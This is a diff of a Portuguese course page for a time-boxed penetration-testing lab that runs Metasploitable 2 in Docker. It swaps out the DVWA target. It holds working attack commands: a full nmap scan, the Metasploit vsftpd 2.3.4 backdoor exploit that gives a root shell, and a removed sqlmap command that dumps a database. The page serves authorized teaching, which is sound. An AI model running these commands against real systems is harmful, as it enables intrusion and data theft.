@@ -97,7 +97,7 @@ Express significa **caixa de tempo**: você não vai testar tudo, vai testar o q
 
 **1. Confirme o escopo.** Seu único alvo autorizado é o **laboratório da disciplina**. Tudo fora dele = não toque.
 
-**2. Suba o laboratório (já vem pronto).** O ambiente traz a **máquina atacante (Kali com as ferramentas)** e os **alvos** já configurados, em rede isolada. Você não instala nada além do Docker — sem perder tempo montando ambiente.
+**2. Suba o laboratório (já vem pronto).** O ambiente traz a **máquina atacante (Kali com as ferramentas)** e o **alvo** já configurado, em rede isolada. Você não instala nada além do Docker — sem perder tempo montando ambiente.
 
 > [!tip] ⬇️ Laboratório pronto (Docker)
 > Baixe e descompacte o **[[Recursos/Segurança da informação/Teste de Intrusão Express/pentest-express-lab.zip|pentest-express-lab.zip]]**. Dentro da pasta `pentest-express/`:
@@ -110,23 +110,24 @@ Express significa **caixa de tempo**: você não vai testar tudo, vai testar o q
 >
 > | Nome | O que é | Como começar |
 > |------|---------|--------------|
-> | `alvo` | Metasploitable 2 (SO/serviços) | `nmap alvo` |
-> | `alvo-web` | DVWA (web) | `curl http://alvo-web` |
+> | `alvo` | Metasploitable 2 (SO + serviços vulneráveis) | `nmap alvo` |
 >
 > O zip traz `docker-compose.yml` + `atacante/Dockerfile` + `README`. Tudo que você salvar em `/work` aparece na pasta `work/` no host e **sobrevive ao `docker compose down`** — é onde mora sua entrega.
 
 > [!info] 💻 Requisitos da máquina e a primeira execução
-> **O que você baixa da página é minúsculo:** o `.zip` tem alguns **KB** (só os arquivos de texto do Docker). As imagens (~7 GB no total) o Docker **baixa e constrói na sua máquina** na primeira vez que você roda `docker compose up -d --build` — e ficam em **cache**: as próximas vezes sobem em segundos e **sem internet**.
+> **O que você baixa da página é minúsculo:** o `.zip` tem alguns **KB** (só os arquivos de texto do Docker). As imagens (~6 GB no total) o Docker **baixa e constrói na sua máquina** na primeira vez que você roda `docker compose up -d --build` — e ficam em **cache**: as próximas vezes sobem em segundos e **sem internet**.
 >
 > | Recurso | Mínimo | Recomendado |
 > |---------|--------|-------------|
 > | CPU | 2 núcleos (x86-64, virtualização ligada) | 4 núcleos |
 > | RAM | 4 GB (Linux) · 8 GB (Windows/macOS) | 8 GB |
-> | Disco livre | 15 GB | 20 GB (SSD) |
+> | Disco livre | 10 GB | 15 GB (SSD) |
 > | Sistema | Windows 10/11 (WSL2), macOS 11+ ou Linux, **com Docker** | — |
 > | Internet | só na 1ª vez (baixar as imagens) | — |
 >
-> Rodando, os três containers somam **menos de 0,5 GB de RAM** — o que pesa é o **disco** das imagens. Em Windows/macOS o Docker roda numa máquina virtual própria, por isso os 8 GB.
+> Rodando, os dois containers somam **menos de 0,3 GB de RAM** — o que pesa é o **disco** das imagens. Em Windows/macOS o Docker roda numa máquina virtual própria, por isso os 8 GB.
+>
+> ⚠️ **Mac com Apple Silicon (M1/M2/M3):** o Metasploitable 2 é uma imagem **x86-64 (amd64)** antiga; no Mac ARM ela roda emulada (lenta) ou pode falhar. Prefira **Linux ou Windows/WSL2 (x86-64)**, uma VM x86 ou o laboratório do campus.
 
 **3. Crie a pasta de evidências.** Sem evidência não há relatório. Dentro da máquina atacante:
 
@@ -147,10 +148,6 @@ Objetivo: descobrir **quais portas estão abertas, quais serviços e quais vers�
 ```bash
 # Varredura completa do alvo: portas, versões, scripts padrão, SO
 nmap -sC -sV -O -p- --open alvo -oA recon/nmap_full
-
-# No alvo web (DVWA), enumere também o conteúdo:
-nikto -h http://alvo-web -o recon/nikto.txt
-gobuster dir -u http://alvo-web -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -o recon/gobuster.txt
 ```
 
 **Resultado observável:** uma lista de portas com serviço e versão (no lab: `21/tcp vsftpd 2.3.4`, `80/tcp Apache 2.2.8`, `139/445 Samba`, `3306 MySQL`, `8180 Tomcat`…). Cada versão antiga é um candidato a vulnerabilidade.
@@ -173,19 +170,20 @@ searchsploit samba 3.
 msfconsole -q
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS alvo
+set LHOST eth0     # interface do atacante (necessário nesta versão do Metasploit)
 run
-# ➜ shell obtida; confirme quem você é:
+# ➜ sessão aberta; confirme quem você é:
 id
 ```
 
-**Para alvo web** (DVWA / Juice Shop), os vetores mais rápidos são SQL Injection, upload de webshell e credencial padrão. Comece pelo `sqlmap`:
-
-```bash
-sqlmap -u "http://alvo-web/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<seu_cookie>; security=low" --batch --dump
-```
+> [!warning] Deu `port 6200 already open / in-use`?
+> Um disparo anterior deixou o backdoor preso na porta 6200 do alvo. Reinicie **só o alvo** (no terminal do host, não dentro do atacante) e rode o exploit de novo:
+> ```bash
+> docker compose restart alvo
+> ```
 
 > [!warning] 📸 Tire o print AGORA
-> No instante em que `id` ou o dump retornar, **capture a tela e salve a saída**. Essa é a "prova de conceito" (PoC) do seu achado. Sem ela, o achado não existe no relatório.
+> No instante em que o `id` retornar `uid=0(root)`, **capture a tela e salve a saída**. Essa é a "prova de conceito" (PoC) do seu achado. Sem ela, o achado não existe no relatório.
 
 > [!tip] Aprofundar
 > Catálogo de técnicas de exploração e payloads: [[Exploração do alvo]]. Walkthrough completo com 4 vetores no mesmo alvo: [[Juntando tudo (745)]].
@@ -337,7 +335,7 @@ flowchart LR
 ## 🧪 Atividade integradora (express, ponta a ponta)
 
 > [!example] 🧪 Faça um pentest inteiro em uma sessão
-> **Alvo:** o laboratório autorizado da disciplina (Metasploitable 2 ou DVWA, via Docker).
+> **Alvo:** o laboratório autorizado da disciplina (Metasploitable 2, via Docker).
 > **Objetivo:** percorrer os Passos 0 → 6 e entregar os **dois relatórios**.
 >
 > **Roteiro:**
